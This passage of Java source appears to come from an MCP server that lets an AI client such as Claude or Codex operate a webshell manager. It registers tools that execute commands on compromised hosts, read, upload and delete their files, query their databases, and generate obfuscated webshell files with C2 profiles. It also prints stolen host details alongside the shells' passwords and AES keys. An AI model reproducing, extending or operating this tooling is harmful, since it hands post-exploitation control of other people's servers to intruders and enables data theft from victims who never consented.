        sb.append(",").append(t("shell_export","\u5bfc\u51fa Shell \u914d\u7f6e\u4e3a\u94fe\u63a5", p("shellId",s("\u53ef\u9009\u5355\u4e2a\u6216\u591a\u4e2a"))));
        sb.append(",").append(t("shell_import","\u4ece gsl5://import?data=... \u94fe\u63a5\u5bfc\u5165 Shell\uff08\u81ea\u52a8\u56de\u8fde\u6d4b\u8bd5\uff0c\u8fd4\u56de\u8fde\u63a5\u72b6\u6001\u548c\u7cfb\u7edf\u4fe1\u606f\uff09", p("link",s("\u5fc5\u586b,gsl5://..."))));
        // Settings (2)
        sb.append(",").append(t("settings_get","\u8bfb\u53d6\u5e94\u7528\u8bbe\u7f6e", p("key",s("\u53ef\u9009"))));
        sb.append(",").append(t("settings_set","\u4fee\u6539\u5e94\u7528\u8bbe\u7f6e", p("key",s("\u5fc5\u586b"),"value",s("\u5fc5\u586b"))));
                sb.append(",").append(t("config_read","\u8bfb\u53d6 config.yaml", p()));
        sb.append(",").append(t("config_write","\u5199\u5165 config.yaml", p("content",s("\u5185\u5bb9"))));
        sb.append(",").append(t("mcp_config","\u751f\u6210/\u5199\u5165 Claude \u6216 Codex \u7684 MCP \u914d\u7f6e", p("client",s("\u53ef\u9009:claude|codex|all,\u9ed8\u8ba4claude"),"outputPath",s("\u53ef\u9009,\u5199\u51fa\u6587\u4ef6\u8def\u5f84"),"host",s("\u53ef\u9009,\u7f51\u5361IP/\u57df\u540d,auto=\u81ea\u52a8"),"write",s("\u53ef\u9009:true=\u5199\u5165\u672c\u673a\u9ed8\u8ba4\u8def\u5f84"))));
        sb.append(",").append(t("mcp_status","MCP \u670d\u52a1\u72b6\u6001(\u542b\u7ed1\u5b9a\u5730\u5740/\u53ef\u8bbf\u95eeURL)", p()));
        sb.append(",").append(t("oplog_query","\u67e5\u8be2\u56e2\u961f\u64cd\u4f5c\u65e5\u5fd7", p("limit",i(),"action",s("\u53ef\u9009"))));
        sb.append(",").append(t("shell_backup","\u5907\u4efd Shell \u5217\u8868", p("genFile",s("\u53ef\u9009"))));
        sb.append(",").append(t("shell_count","Shell \u7edf\u8ba1", p("group",s("\u53ef\u9009"))));
        sb.append(",").append(t("shell_search","\u641c\u7d22 Shell", p("keyword",s("\u5173\u952e\u8bcd"))));
        sb.append(",").append(t("shell_clone","\u514b\u9686 Shell", p("shellId",s("\u5fc5\u586b"),"newUrl",s("\u53ef\u9009"))));
        sb.append(",").append(t("shell_batch_test","\u6279\u91cf\u6d4b\u8bd5\u8fde\u63a5", p("group",s("\u53ef\u9009"))));
        sb.append(",").append(t("shell_create","\u76f4\u63a5\u751f\u6210WebShell\u6587\u4ef6\u3002\u652f\u6301\u6a21\u7cca\u52a0\u5bc6\u5668\u540d(aesbase64/java_c2/gzip\u7b49\u81ea\u52a8\u8bc6\u522b),C2\u7c7b\u578b\u81ea\u52a8\u9009\u6a21\u677f,\u65e0\u9700payload_list/c2profile_list", p("url",s("\u9009\u586b"),"password",s("\u9009\u586b,\u9ed8\u8ba4pass"),"secretKey",s("\u9009\u586b,\u9ed8\u8ba4key"),"payload",s("\u9009\u586b,\u9ed8\u8ba4JavaDynamicPayload"),"cryption",s("\u5fc5\u586b,\u652f\u6301\u6a21\u7cca\u540d\u5982aesbase64/java_c2/gzip"),"genFile",s("\u5fc5\u586b,\u8f93\u51fa\u8def\u5f84"),"obfuscation",s("\u9009\u586b:none/default/superObfuscation/superUnicode/superHex/superXml/superRandom/superDouble"),"c2Profile",s("\u9009\u586b,C2\u7c7b\u578b\u81ea\u52a8\u9009\u7b2c\u4e00\u4e2a"))));
        sb.append(",").append(t("process_list","\u8fdb\u7a0b\u5217\u8868", p("shellId",s("\u5fc5\u586b"))));
        sb.append(",").append(t("file_search","\u641c\u7d22\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"pattern",s("\u5fc5\u586b"),"path",s("\u53ef\u9009"))));
        sb.append(",").append(t("net_info","\u7f51\u7edc\u4fe1\u606f", p("shellId",s("\u5fc5\u586b"))));
        // Plugin tools (scanned @McpTool); dedupe by name - impl selected by shell payload at call time
        scanPluginTools();
        java.util.HashSet<String> seenTools = new java.util.HashSet<>();
        for (PluginToolInfo info : PLUGIN_TOOLS) {
            if (seenTools.add(info.name)) {
                sb.append(",").append(t(info.name, info.ann.desc(), pluginToolSchema(info)));
            }
        }
        sb.append("]}}");
        return sb.toString();
    }

    // ==================== TOOLS CALL DISPATCH ====================
    @SuppressWarnings("unchecked")
    private String toolsCall(Object params, Object id) {
        Map<String, Object> p = (Map<String, Object>) params;
        String name = (String) p.get("name");
        Map<String, Object> a = (Map<String, Object>) p.getOrDefault("arguments", new java.util.HashMap<>());
        String text;
        try {
            switch (name) {
                case "shell_count":  text = shellCount(a); break;
                case "shell_search": text = shellSearch(a); break;
                case "shell_list":   text = shellList(a); break;
                case "shell_get":    text = shellGet(a); break;
                case "shell_add":    text = shellAdd(a); break;
                case "shell_edit":   text = shellEdit(a); break;
                case "shell_delete": text = shellDelete(a); break;
                case "shell_clone":  text = shellClone(a); break;
                case "shell_batch_test": text = shellBatchTest(a); break;
                case "shell_info":   text = shellInfo(a); break;
                case "shell_test":   text = shellTest(a); break;
                case "shell_detect_encoding": text = shellDetectEncoding(a); break;
                case "shell_exec":   text = shellExec(a); break;
                case "process_list": text = processList(a); break;
                case "file_search":  text = fileSearch(a); break;
                case "net_info":     text = netInfo(a); break;
                case "file_list":    text = fileList(a); break;
                case "file_read":    text = fileRead(a); break;
                case "file_upload_local": text = fileUploadLocal(a); break;
                case "file_download_local": text = fileDownloadLocal(a); break;
                case "file_delete":  text = fileDelete(a); break;
                case "file_copy":    text = fileCopy(a); break;
                case "file_move":    text = fileMove(a); break;
                case "file_mkdir":   text = fileMkdir(a); break;
                case "file_attr":    text = fileAttr(a); break;
                case "file_remote_down": text = fileRemoteDown(a); break;
                case "file_roots":   text = fileRoots(a); break;
                case "db_connect":   text = dbConnect(a); break;
                case "db_exec":      text = dbExec(a); break;
                case "db_databases": text = dbDatabases(a); break;
                case "db_tables":    text = dbTables(a); break;
                case "db_preview":   text = dbPreview(a); break;
                case "db_count":     text = dbCount(a); break;
                case "db_list_types": text = dbListTypes(a); break;
                case "db_configs":   text = dbConfigs(a); break;
                case "payload_list": text = payloadList(); break;
                case "c2profile_list": text = c2profileList(a); break;
                case "c2profile_get":  text = c2profileGet(a); break;
                case "shell_env":    text = shellEnv(a); break;
                case "shell_export": text = shellExport(a); break;
                case "shell_import": text = shellImport(a); break;
                case "shell_create":  text = shellCreate(a); break;
                case "settings_get": text = settingsGet(a); break;
                case "settings_set": text = settingsSet(a); break;
                case "config_read":  text = configRead(a); break;
                case "config_write": text = configWrite(a); break;
                case "oplog_query":  text = oplogQuery(a); break;
                case "shell_backup": text = shellBackup(a); break;
                case "mcp_status":  text = mcpStatus(a); break;
                case "mcp_config":  text = mcpConfig(a); break;
                default: {
                    text = callPluginTool(name, a);
                    break;
                }
            }
        } catch (Exception e) {
            text = "\u6267\u884c\u5931\u8d25: " + e.getClass().getSimpleName() + ": " + (e.getMessage() != null ? e.getMessage() : "");
        }
        return j("jsonrpc","2.0","id",id,"result",m("content",a(m("type","text","text",text))));
    }

    // ==================== IMPLEMENTATIONS ====================

    private ShellEntity getShell(Map<String, Object> a) {
        String sid = (String) a.get("shellId");
        ShellEntity sh = Db.getOneShell(sid);
        if (sh == null) throw new RuntimeException("\u672a\u627e\u5230 Shell: " + sid);
        return sh;
    }

    private ShellEntity getShellInit(Map<String, Object> a) {
        String sid = (String) a.get("shellId");
        // encoding param: explicit charset, or "auto" to force re-detect
        String encParam = a.containsKey("encoding") ? String.valueOf(a.get("encoding")) : null;
        if (encParam != null && (encParam.isEmpty() || "null".equalsIgnoreCase(encParam))) encParam = null;
        boolean forceAuto = encParam != null && "auto".equalsIgnoreCase(encParam.trim());
        String encOverride = (encParam != null && !forceAuto) ? encParam.trim() : null;

        ShellEntity sh = shellCache.get(sid);
        if (sh != null && sh.getPayloadModule() != null) {
            // cached: reuse unless caller forces different encoding / auto re-detect
            if (!forceAuto && (encOverride == null || encOverride.equalsIgnoreCase(safeEncoding(sh.getEncoding())))) {
                return sh;
            }
            closeShell(sid);
        }
        synchronized (shellCache) {
            sh = shellCache.get(sid);
            if (sh != null && sh.getPayloadModule() != null) {
                if (!forceAuto && (encOverride == null || encOverride.equalsIgnoreCase(safeEncoding(sh.getEncoding())))) {
                    return sh;
                }
                closeShell(sid);
            }
            sh = getShell(a);
            // DB encoding is always loaded via Db.getOneShell -> setEncoding
            String dbEncoding = sh.getEncoding() == null ? "" : sh.getEncoding().trim();
            boolean dbEmpty = dbEncoding.isEmpty();
            if (encOverride != null) {
                sh.setEncoding(encOverride);
            } else {
                // init with DB value (fallback UTF-8); auto-detect only if empty or force auto
                sh.setEncoding(safeEncoding(dbEncoding));
            }
            if (!sh.initShellOpertion()) throw new RuntimeException("Shell \u521d\u59cb\u5316\u5931\u8d25" + (sh.lastInitError != null ? ": " + sh.lastInitError : ""));
            if (encOverride != null) {
                // explicit charset: keep and sync module only
                sh.setEncoding(safeEncoding(sh.getEncoding()));
            } else if (forceAuto || dbEmpty) {
                // DB empty or encoding=auto: full detect (chcp + score) + persist
                applyAutoEncoding(sh, dbEncoding, true);
            } else {
                // DB has value: cheap stage1 verify (one chcp/locale); correct if mismatch
                verifyEncodingWithProbe(sh, dbEncoding);
            }
            shellCache.put(sid, sh);
        }
        return sh;
    }

    /** \u8fd4\u56de\u975e\u7a7a encoding\uff0c\u7a7a/\u7a7a\u4e32/null \u56de\u9000 UTF-8 */
    private static String safeEncoding(String encoding) {
        if (encoding == null) return "UTF-8";
        String e = encoding.trim();
        return e.isEmpty() ? "UTF-8" : e;
    }

    /**
     * Cheap verify: one chcp/locale probe. If remote codepage clearly differs from DB,
     * switch + re-init + persist. Avoids multi-candidate scoring on every cold connect.
     */
    private void verifyEncodingWithProbe(ShellEntity sh, String dbEncoding) {
        try {
            Payload pl = sh.getPayloadModule();
            if (pl == null) { sh.setEncoding(safeEncoding(dbEncoding)); return; }
            String os = "";
            try { os = pl.getOsInfo(); } catch (Exception ignored) {}
            boolean isWin = os != null && os.toLowerCase().contains("win");
            String probe = isWin
                    ? pl.execCommand("chcp")
                    : pl.execCommand("locale charmap 2>/dev/null || echo $LANG");
            String fromProbe = parseEncodingFromProbe(probe, isWin);
            String cur = safeEncoding(dbEncoding);
            if ("Auto".equalsIgnoreCase(cur)) return; // Auto: Encoding.Decoding 逐响应自动探测，无需 chcp 改写
            if (fromProbe != null && !fromProbe.equalsIgnoreCase(cur)) {
                sh.setEncoding(fromProbe);
                try { if (sh.getPayloadModule() != null) sh.getPayloadModule().close(); } catch (Exception ignored) {}
                if (!sh.initShellOpertion()) {
                    sh.setEncoding(cur);
                    if (!sh.initShellOpertion()) throw new RuntimeException("Shell \u521d\u59cb\u5316\u5931\u8d25(encoding\u56de\u9000)");
                    return;
                }
                try { Db.updateShell(sh); } catch (Exception ignored) {}
            } else {
                sh.setEncoding(cur);
            }
        } catch (RuntimeException re) {
            throw re;
        } catch (Exception ignored) {
            sh.setEncoding(safeEncoding(dbEncoding));
        }
    }

    /**
     * Auto-detect remote console encoding after connect.
     * Priority: chcp / locale -> score candidates -> OS heuristic.
     * When persist=true and result differs from DB, write back via Db.updateShell.
     */
    private void applyAutoEncoding(ShellEntity sh, String dbEncoding, boolean persist) {
        try {
            String detected = detectRemoteEncoding(sh);
            String cur = safeEncoding(sh.getEncoding());
            if (detected == null || detected.isEmpty()) detected = cur;
            if (!detected.equalsIgnoreCase(cur)) {
                sh.setEncoding(detected);
                // re-init so payload re-decodes basicsInfo with correct charset
                try { if (sh.getPayloadModule() != null) sh.getPayloadModule().close(); } catch (Exception ignored) {}
                if (!sh.initShellOpertion()) {
                    // fallback to previous
                    sh.setEncoding(cur);
                    if (!sh.initShellOpertion()) throw new RuntimeException("Shell \u521d\u59cb\u5316\u5931\u8d25(encoding\u56de\u9000)");
                    return;
                }
            } else {
                sh.setEncoding(cur); // sync module charset
            }
            if (persist) {
                String finalEnc = safeEncoding(sh.getEncoding());
                if (dbEncoding == null || dbEncoding.isEmpty() || !finalEnc.equalsIgnoreCase(dbEncoding)) {
                    try { Db.updateShell(sh); } catch (Exception ignored) {}
                }
            }
        } catch (RuntimeException re) {
            throw re;
        } catch (Exception ignored) {
            sh.setEncoding(safeEncoding(sh.getEncoding()));
        }
    }

    /**
     * MCP tool: force detect remote encoding, optionally persist to DB.
     * Always re-detects (ignores cache encoding trust).
     */
    private String shellDetectEncoding(Map<String, Object> a) {
        String sid = (String) a.get("shellId");
        if (sid == null || sid.isEmpty()) return "\u7f3a\u5c11 shellId";
        boolean persist = true;
        if (a.containsKey("persist")) {
            String p = String.valueOf(a.get("persist"));
            persist = !("false".equalsIgnoreCase(p) || "0".equals(p) || "no".equalsIgnoreCase(p));
        }
        // force re-detect via encoding=auto path
        java.util.HashMap<String, Object> args = new java.util.HashMap<>();
        args.put("shellId", sid);
        args.put("encoding", "auto");
        // temporarily connect; applyAutoEncoding always runs on forceAuto
        // but persist controlled here: do detect manually for report
        closeShell(sid);
        ShellEntity sh = getShell(args);
        String before = sh.getEncoding() == null ? "" : sh.getEncoding().trim();
        sh.setEncoding(safeEncoding(before));
        if (!sh.initShellOpertion()) return "\u8fde\u63a5\u5931\u8d25\uff0c\u65e0\u6cd5\u68c0\u6d4b encoding";
        String detected = detectRemoteEncoding(sh);
        if (detected == null || detected.isEmpty()) detected = safeEncoding(before);

        String probe = "";
        try {
            Payload pl = sh.getPayloadModule();
            String os = pl != null ? pl.getOsInfo() : "";
            boolean isWin = os != null && os.toLowerCase().contains("win");
            probe = isWin ? pl.execCommand("chcp") : pl.execCommand("locale charmap 2>/dev/null || echo $LANG");
            if (probe != null && probe.length() > 200) probe = probe.substring(0, 200);
        } catch (Exception ignored) {}

        boolean changed = !detected.equalsIgnoreCase(safeEncoding(before));
        if (changed) {
            sh.setEncoding(detected);
            try { if (sh.getPayloadModule() != null) sh.getPayloadModule().close(); } catch (Exception ignored) {}
            if (!sh.initShellOpertion()) {
                sh.setEncoding(safeEncoding(before));
                sh.initShellOpertion();
                return "\u68c0\u6d4b\u5230 " + detected + " \u4f46\u91cd\u521d\u59cb\u5316\u5931\u8d25\uff0c\u5df2\u56de\u9000 " + safeEncoding(before);
            }
        } else {
            sh.setEncoding(detected);
        }
        shellCache.put(sid, sh);
        boolean saved = false;
        if (persist && (before.isEmpty() || changed)) {
            try { saved = Db.updateShell(sh) > 0; } catch (Exception e) { saved = false; }
        }
        StringBuilder sb = new StringBuilder();
        sb.append("shellId: ").append(sid).append("\n");
        sb.append("before: ").append(before.isEmpty() ? "(empty)" : before).append("\n");
        sb.append("detected: ").append(detected).append("\n");
        sb.append("changed: ").append(changed).append("\n");
        sb.append("persisted: ").append(saved).append("\n");
        if (probe != null && !probe.isEmpty()) sb.append("probe: ").append(probe.trim()).append("\n");
        return sb.toString();
    }

    /**
     * Detect remote encoding.
     * 1) Windows: chcp -> 936/GBK, 65001/UTF-8, 950/BIG5, 54936/GB18030
     * 2) Linux: locale charmap / $LANG
     * 3) Score candidates by running a tiny probe under each charset
     * 4) OS fallback
     */
    private String detectRemoteEncoding(ShellEntity sh) {
        Payload pl = sh.getPayloadModule();
        if (pl == null) return safeEncoding(sh.getEncoding());

        String os = "";
        try { os = pl.getOsInfo(); } catch (Exception ignored) {}
        boolean isWin = os != null && os.toLowerCase().contains("win");

        // --- stage 1: code page / locale (ASCII digits survive wrong decode) ---
        try {
            String probe = isWin
                    ? pl.execCommand("chcp")
                    : pl.execCommand("locale charmap 2>/dev/null || echo $LANG");
            String fromProbe = parseEncodingFromProbe(probe, isWin);
            if (fromProbe != null) return fromProbe;
        } catch (Exception ignored) {}

        // --- stage 2: score candidates with sample output ---
        String[] candidates = isWin
                ? new String[]{"GBK", "GB18030", "UTF-8", "BIG5", "CP850"}
                : new String[]{"UTF-8", "GBK", "GB18030", "ISO-8859-1"};
        // Prefer DB value first if present
        String dbHint = safeEncoding(sh.getEncoding());
        java.util.LinkedHashSet<String> ordered = new java.util.LinkedHashSet<>();
        ordered.add(dbHint);
        for (String c : candidates) ordered.add(c);

        String best = dbHint;
        int bestScore = Integer.MIN_VALUE;
        String saved = safeEncoding(sh.getEncoding());
        for (String cand : ordered) {
            try {
                sh.setEncoding(cand);
                String sample = isWin
                        ? pl.execCommand("cmd /c echo \u4e2d\u6587& chcp")
                        : pl.execCommand("printf '\\xe4\\xb8\\xad\\xe6\\x96\\x87\\n'; locale charmap 2>/dev/null; echo $LANG");
                int score = scoreDecodedText(sample, cand, isWin);
                if (score > bestScore) {
                    bestScore = score;
                    best = cand;
                }
            } catch (Exception ignored) {}
        }
        // restore before caller decides re-init
        sh.setEncoding(saved);

        if (bestScore > 0) return best;

        // --- stage 3: OS heuristic ---
        return isWin ? "GBK" : "UTF-8";
    }

    /** Parse chcp / locale output into charset name. */
    private static String parseEncodingFromProbe(String probe, boolean isWin) {
        if (probe == null || probe.isEmpty()) return null;
        String p = probe.toLowerCase();
        // Prefer explicit "Active code page: NNN" / "cpNNN"
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("(?:code\\s*page|cp)\\s*[:\\s]*([0-9]{3,5})")
                .matcher(p);
        if (m.find()) {
            String mapped = mapCodePage(m.group(1));
            if (mapped != null) return mapped;
        }
        // bare digits common in chcp output
        m = java.util.regex.Pattern.compile("\\b(65001|54936|936|950|437|850)\\b").matcher(p);
        if (m.find()) {
            String mapped = mapCodePage(m.group(1));
            if (mapped != null) return mapped;
        }
        // text hints
        if (p.contains("gb18030")) return "GB18030";
        if (p.contains("gbk") || p.contains("gb2312") || p.contains("gb 2312")) return "GBK";
        if (p.contains("big5")) return "BIG5";
        if (p.contains("utf-8") || p.contains("utf8")) return "UTF-8";
        if (p.contains("zh_cn.gbk") || p.contains("zh_cn.gb2312")) return "GBK";
        if (p.contains("zh_tw") && p.contains("big5")) return "BIG5";
        if (!isWin && (p.contains("ansi_x3.4") || p.contains("ascii"))) return "UTF-8";
        return null;
    }

    private static String mapCodePage(String cp) {
        if (cp == null) return null;
        switch (cp.trim()) {
            case "936": return "GBK";
            case "54936": return "GB18030";
            case "65001": return "UTF-8";
            case "950": return "BIG5";
            case "437":
            case "850": return "CP850";
            default: return null;
        }
    }

    /**
     * Higher is better. Rewards CJK + codepage hints; penalizes replacement/mojibake.
     */
    private static int scoreDecodedText(String text, String cand, boolean isWin) {
        if (text == null) return Integer.MIN_VALUE / 2;
        int score = 0;
        int cjk = 0, repl = 0, mojibake = 0, ascii = 0;
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (c == '\ufffd') repl++;
            else if (c >= 0x4E00 && c <= 0x9FFF) cjk++;
            else if (c < 128) ascii++;
            // common UTF-8-as-Latin1 / GBK-as-UTF8 mojibake markers
            if (c == '\u00c3' || c == '\u00e2' || c == '\u00c2' || c == '\ufffd') mojibake++;
            if (c == '\u00e6' || c == '\u00e5' || c == '\u00e4') mojibake++; // utf8 chinese misread
        }
        score += cjk * 8;
        score += Math.min(ascii, 40);
        score -= repl * 20;
        score -= mojibake * 3;
        // bonus if probe text aligns with candidate
        String low = text.toLowerCase();
        if ("GBK".equalsIgnoreCase(cand) && (low.contains("936") || cjk > 0)) score += 30;
        if ("UTF-8".equalsIgnoreCase(cand) && (low.contains("65001") || low.contains("utf-8") || low.contains("utf8"))) score += 30;
        if ("BIG5".equalsIgnoreCase(cand) && low.contains("950")) score += 30;
        if ("GB18030".equalsIgnoreCase(cand) && low.contains("54936")) score += 30;
        if (isWin && "UTF-8".equalsIgnoreCase(cand) && low.contains("936")) score -= 40;
        if (isWin && "GBK".equalsIgnoreCase(cand) && low.contains("65001")) score -= 20;
        return score;
    }

    static void closeShell(String sid) {
        ShellEntity sh = shellCache.remove(sid);
        if (sh != null) {
            try { if (sh.getPayloadModule() != null) sh.getPayloadModule().close(); } catch (Exception ignored) {}
        }
    }

    private int toInt(Object v, int def) {
        if (v == null) return def;
        if (v instanceof Number) return ((Number) v).intValue();
        try { return Integer.parseInt(v.toString()); } catch (Exception e) { return def; }
    }
    private long toLong(Object v, long def) {
        if (v == null) return def;
        if (v instanceof Number) return ((Number) v).longValue();
        try { return Long.parseLong(v.toString()); } catch (Exception e) { return def; }
    }

    private String shellSearch(Map<String, Object> a) {
        String kwRaw = (String) a.get("keyword");
        if (kwRaw == null || kwRaw.isEmpty()) return "\u8bf7\u63d0\u4f9b\u641c\u7d22\u5173\u952e\u5b57";
        String kw = kwRaw.toLowerCase();
        Vector<Vector<String>> rows = Db.getAllShell();
        if (rows.size() <= 1) return "\u65e0 Shell \u8bb0\u5f55";
        rows.remove(0);
        StringBuilder sb = new StringBuilder();
        int found = 0;
        for (Vector<String> row : rows) {
            String line = row.get(0) + " " + (row.size()>1?row.get(1):"") + " " + (row.size()>15?row.get(15):"");
            if (line.toLowerCase().contains(kw)) {
                sb.append(row.get(0)).append(" | ").append(row.size()>1?row.get(1):"").append(" | ").append(row.size()>5?row.get(5):"").append(" | ").append(row.size()>15?row.get(15):"").append("\n");
                found++;
            }
        }
        return found > 0 ? "\u627e\u5230 " + found + " \u4e2a:\n" + sb.toString() : "\u672a\u627e\u5230\u5339\u914d \"" + kw + "\" \u7684 Shell";
    }

    private String shellCount(Map<String, Object> a) {
        String group = (String) a.getOrDefault("group", "/");
        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
        int total = rows.size() > 0 ? rows.size() - 1 : 0;
        return "Shell \u603b\u6570: " + total + " (\u5206\u7ec4: " + group + ")";
    }

    // --- Shell CRUD ---
    private String shellList(Map<String, Object> a) {
        String group = (String) a.getOrDefault("group", "/");
        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
        if (rows.size() > 1) rows.remove(0);
        StringBuilder sb = new StringBuilder();
        for (Vector<String> row : rows) {
            String sid = row.get(0); String url = row.size()>1?row.get(1):""; String payload = row.size()>4?row.get(4):"";
            String cryption = row.size()>5?row.get(5):""; String remark = row.size()>15?row.get(15):"";
            sb.append(sid).append(" | ").append(url).append(" | ").append(payload).append("+").append(cryption);
            if (!remark.isEmpty()) sb.append(" | ").append(remark); sb.append("\n");
        }
        return sb.length()>0 ? sb.toString() : "\u65e0 Shell \u8bb0\u5f55";
    }

    private String shellGet(Map<String, Object> a) { return getShell(a).toString(); }

    private String shellAdd(Map<String, Object> a) {
        ShellEntity sh = new ShellEntity();
        sh.setId(UUID.randomUUID().toString());
        sh.setUrl((String) a.get("url"));
        sh.setPassword((String) a.get("password"));
        sh.setSecretKey((String) a.get("secretKey"));
        sh.setPayload((String) a.get("payload"));
        sh.setCryption((String) a.get("cryption"));
        sh.setEncoding((String) a.getOrDefault("encoding", "Auto"));
        if (a.containsKey("remark")) sh.setRemark((String) a.get("remark"));
        if (a.containsKey("headers")) sh.setHeader((String) a.get("headers"));
        if (a.containsKey("proxyType")) sh.setProxyType((String) a.get("proxyType"));
        if (a.containsKey("proxyHost")) sh.setProxyHost((String) a.get("proxyHost"));
        if (a.containsKey("proxyPort")) sh.setProxyPort(toInt(a.get("proxyPort"), 8080));
        if (a.containsKey("connTimeout")) sh.setConnTimeout(toInt(a.get("connTimeout"), 60000));
        if (a.containsKey("readTimeout")) sh.setReadTimeout(toInt(a.get("readTimeout"), 60000));
        if (a.containsKey("c2Profile")) sh.setC2ProfileName((String) a.get("c2Profile"));
        if (a.containsKey("maxRetry")) sh.setMaxErrRetry(toInt(a.get("maxRetry"), 3));
        if (Db.addShell(sh) > 0) { sh.setGroup("/");
            return "\u6dfb\u52a0\u6210\u529f! Shell ID: " + sh.getId();
        }
        return "\u6dfb\u52a0\u5931\u8d25";
    }

    private String shellEdit(Map<String, Object> a) {
        ShellEntity sh = getShell(a);
        if (a.containsKey("url")) sh.setUrl((String) a.get("url"));
        if (a.containsKey("password")) sh.setPassword((String) a.get("password"));
        if (a.containsKey("secretKey")) sh.setSecretKey((String) a.get("secretKey"));
        if (a.containsKey("payload")) sh.setPayload((String) a.get("payload"));
        if (a.containsKey("cryption")) sh.setCryption((String) a.get("cryption"));
        if (a.containsKey("encoding")) sh.setEncoding((String) a.get("encoding"));
        if (a.containsKey("remark")) sh.setRemark((String) a.get("remark"));
        if (a.containsKey("headers")) sh.setHeader((String) a.get("headers"));
        if (a.containsKey("proxyType")) sh.setProxyType((String) a.get("proxyType"));
        if (a.containsKey("proxyHost")) sh.setProxyHost((String) a.get("proxyHost"));
        if (a.containsKey("proxyPort")) sh.setProxyPort(toInt(a.get("proxyPort"), 8080));
        if (a.containsKey("connTimeout")) sh.setConnTimeout(toInt(a.get("connTimeout"), 60000));
        if (a.containsKey("readTimeout")) sh.setReadTimeout(toInt(a.get("readTimeout"), 60000));
        if (a.containsKey("reqLeft")) sh.setReqLeft((String) a.get("reqLeft"));
        if (a.containsKey("reqRight")) sh.setReqRight((String) a.get("reqRight"));
        if (a.containsKey("c2Profile")) sh.setC2ProfileName((String) a.get("c2Profile"));
        int n = Db.updateShell(sh);
        // \u914d\u7f6e\u53d8\u66f4\u540e\u5fc5\u987b\u6e05\u7f13\u5b58\uff0c\u5426\u5219 encoding \u7b49\u4ecd\u7528\u65e7\u4f1a\u8bdd
        if (n > 0) closeShell(sh.getId());
        return n > 0 ? "\u7f16\u8f91\u6210\u529f" : "\u7f16\u8f91\u5931\u8d25";
    }

    private String shellClone(Map<String, Object> a) {
        ShellEntity src = getShell(a);
        ShellEntity clone = new ShellEntity();
        clone.setId(UUID.randomUUID().toString());
        clone.setUrl(a.containsKey("newUrl") ? (String)a.get("newUrl") : src.getUrl());
        clone.setPassword(src.getPassword()); clone.setSecretKey(src.getSecretKey());
        clone.setPayload(src.getPayload()); clone.setCryption(src.getCryption());
        clone.setEncoding(src.getEncoding());
        if (src.getRemark() != null) clone.setRemark(src.getRemark() + " (clone)");
        if (Db.addShell(clone) > 0) return "\u514b\u9686\u6210\u529f! \u65b0 Shell ID: " + clone.getId() + " URL: " + clone.getUrl();
        return "\u514b\u9686\u5931\u8d25";
    }

    private String shellBatchTest(Map<String, Object> a) {
        String group = (String) a.getOrDefault("group", "/");
        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
        if (rows.size() <= 1) return "\u65e0 Shell \u53ef\u6d4b\u8bd5";
        rows.remove(0);
        StringBuilder sb = new StringBuilder(); int ok = 0, fail = 0;
        for (Vector<String> row : rows) {
            String sid = row.get(0);
            String url = row.size()>1 ? row.get(1) : "";
            // Try from cache first
            ShellEntity cached = shellCache.get(sid);
            if (cached != null && cached.getPayloadModule() != null) {
                try {
                    cached.getPayloadModule().getBasicsInfo();
                    sb.append("[OK-\u7f13\u5b58] ").append(sid).append(" ").append(url).append("\n");
                    ok++; continue;
                } catch (Exception e) { shellCache.remove(sid); }
            }
            try {
                java.util.HashMap<String, Object> args = new java.util.HashMap<>();
                args.put("shellId", sid);
                ShellEntity sh = getShellInit(args);
                sb.append("[OK] ").append(sid).append(" ").append(url)
                  .append(" encoding=").append(safeEncoding(sh.getEncoding())).append("\n");
                ok++;
            } catch (Exception ex) { sb.append("[ERR] ").append(sid).append(" ").append(ex.getMessage()).append("\n"); fail++; }
        }
        return "\u6279\u91cf\u6d4b\u8bd5: " + ok + " \u6210\u529f, " + fail + " \u5931\u8d25\n" + sb.toString();
    }

    private String shellDelete(Map<String, Object> a) {
        String sid = (String) a.get("shellId");
        if (Db.removeShell(sid) > 0) {
            closeShell(sid);
            return "\u5220\u9664\u6210\u529f";
        }
        return "\u5220\u9664\u5931\u8d25";
    }

    // --- System Info ---
    private String shellInfo(Map<String, Object> a) {
        ShellEntity sh = getShellInit(a);
        Payload pl = sh.getPayloadModule();
        String info = pl.getBasicsInfo();
        String enc = safeEncoding(sh.getEncoding());
        StringBuilder sb = new StringBuilder();
        // \u4eff GUI \u8fde\u63a5\u9762\u677f\u7ed3\u6784\u5316\u8f93\u51fa (\u6838\u5fc3 8 \u9879)
        sb.append("URL: ").append(sh.getUrl() == null ? "" : sh.getUrl()).append("\n");
        sb.append("\u4e3b\u673a\u540d: ").append(basicInfoValue(info, "COMPUTERNAME")).append("\n");
        sb.append("\u7528\u6237: ").append(basicInfoValue(info, "CurrentUser")).append("\n");
        String iplist = basicInfoValue(info, "IPList");
        String ip = firstIpv4(iplist);
        sb.append("IP: ").append(ip.isEmpty() ? iplist : ip).append(iplist.isEmpty() ? "" : " (\u5168\u91cf: " + iplist + ")").append("\n");
        sb.append("OS: ").append(osName(basicInfoValue(info, "OsInfo"))).append("\n");
        String real = basicInfoValue(info, "RealFile");
        if (real.isEmpty()) real = pl.currentDir();
        sb.append("Webshell \u8def\u5f84: ").append(real).append("\n");
        sb.append("Shell \u7c7b\u578b: ").append(sh.getPayload()).append(" + ").append(sh.getCryption()).append("\n");
        String key = sh.getSecretKey();
        sb.append("AES Key: ").append(key == null ? "" : key).append("\n");
        sb.append("\u5bc6\u7801: ").append(sh.getPassword() == null ? "" : sh.getPassword()).append("\n");
        sb.append("encoding: ").append(enc).append("\n");
        // \u7cfb\u7edf\u5173\u952e\u4fe1\u606f (basicsInfo \u63d0\u53d6)
        sb.append("\u6587\u4ef6\u7cfb\u7edf\u6839: ").append(basicInfoValue(info, "FileRoot")).append("\n");
        sb.append("\u5f53\u524d\u76ee\u5f55: ").append(basicInfoValue(info, "CurrentDir")).append("\n");
        sb.append("\u4e34\u65f6\u76ee\u5f55: ").append(basicInfoValue(info, "TempDirectory")).append("\n");
        sb.append("\u8fdb\u7a0b\u67b6\u6784: ").append(basicInfoValue(info, "ProcessArch")).append("\n");
